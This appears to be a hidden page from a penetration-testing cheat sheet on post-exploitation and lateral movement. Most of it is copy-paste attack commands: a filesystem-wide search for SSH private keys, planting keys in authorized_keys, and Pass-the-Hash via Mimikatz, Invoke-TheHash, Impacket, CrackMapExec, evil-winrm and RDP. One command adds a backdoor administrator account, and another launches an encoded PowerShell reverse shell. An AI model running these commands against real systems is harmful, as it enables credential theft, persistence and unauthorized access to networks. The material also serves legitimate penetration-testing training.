---
description: >-
  Lateral movement is process in Penetration Testing or Red Teaming when
  attacker moves through system, impersonate users and escalation privileges
  vertically or horizontally.
hidden: true
---

# Post-Exploitation

## SSH Keys

### Looking for keys

```bash
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

* If you have access to some **private key** you could download it and use, but check if permissions to private key is <mark style="color:red;">**chmod 600**</mark>
* If you have access to <mark style="color:green;">`/.ssh/authorized_keys`</mark> file, then put your **public key** inside of this file, and then you could log in without password

```bash
ssh -i /path/to/private/keyfile user@hostname
```

## Pass The Hash

A **Pass the Hash (PTH)** attack involves an attacker using a password hash in place of the actual password for authentication. This method allows the attacker to bypass the need to decrypt the hash to retrieve the password. **PTH** attacks take advantage of the fact that the authentication protocol accepts the hash directly, as it remains unchanged for all sessions until the password is altered.

***

### Windows PTH

#### Mimikatz

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:carni7 /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:{DOMAIN} /run:cmd.exe" exit
```

Explanation:

* <mark style="color:blue;">**`privilege::debug`**</mark> - equivalent of admin rights
* <mark style="color:blue;">**`/user:carni7`**</mark> - user we want to impersonate
* <mark style="color:blue;">**`/rc4`**</mark> or <mark style="color:blue;">**`/NTLM`**</mark> - user's password hash. rc4 is algorithm
* <mark style="color:blue;">**`/domain`**</mark> - The domain to which the user being impersonated belongs. For a local user account, you can use the computer name, localhost, or simply a dot (.)
* <mark style="color:blue;">**`sekurlsa::pth`**</mark> - mimikatz popular module, which is used for extracting credentials from LSASS.
* <mark style="color:blue;">**`/run:cmd.exe`**</mark> - Instructions to mimikatz to run cmd after injecting hash

#### Invoke-TheHash

Besides mimikatz we could use [**Invoke-TheHash**](https://github.com/Kevin-Robertson/Invoke-TheHash) for **PTH** on Windows. This tool uses **PowerShell** functions for performing **Pass the Hash** attacks with **WMI** and **SMB**. Authentication is performed by passing an **NTLM** hash into the NTLMv2 authentication protocol.

```powershell
Import-Module .\Invoke-TheHash.psd1
```

* **SMB**

```powershell
Invoke-SMBExec -Target 13.13.13.13 -Domain somedomain.sus -Username carni7 -Hash 12379N1D2YV31U20931C031 -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

* **WMI**

```powershell
Invoke-WMIExec -Target DC01 -Domain {DOMAIN} -Username carni7 -Hash 12379N1D2YV31U20931C031 -Command "powershell -e JUSTLETSIMAGINETHISISBASE64ENCODEDPOWERSHELLREVERSESHELLCODE=="
```

***

### Linux PTH&#x20;

#### Impacket

Impacket has a lot of useful tools, but for this situtation we need only <mark style="color:blue;">**`PsExec`**</mark>. Besides that we could use also [**wmiexec**](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py), [**atexec**](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py), [**smbexec**](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)**.**&#x20;

```bash
impacket-psexec administrator@13.13.13.13 -hashes :12379N1D2YV31U20931C031
impacket-wmiexec administrator@13.13.13.13 -hashes :12379N1D2YV31U20931C031
```

#### CrackMapExec

```bash
crackmapexec smb 13.13.13.13 -u Administrator -d . -H 12379N1D2YV31U20931C031 -x whoami
```

#### Evil-winrm&#x20;

```bash
evil-winrm -i 13.13.13.13 -u Administrator -H 12379N1D2YV31U20931C031
```

#### RDP

By default, Windows has disabled <mark style="color:green;">`Restricted Admin Mode`</mark>, and we need to fix that by adding new registry key to <mark style="color:green;">`DisableRestrictedAdmin`</mark>

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

And then to use <mark style="color:blue;">**xfreerdp**</mark> for Pass The Hash

```powershell
xfreerdp /v:13.13.13.13 /u:carni7 /pth:12379N1D2YV31U20931C031
```
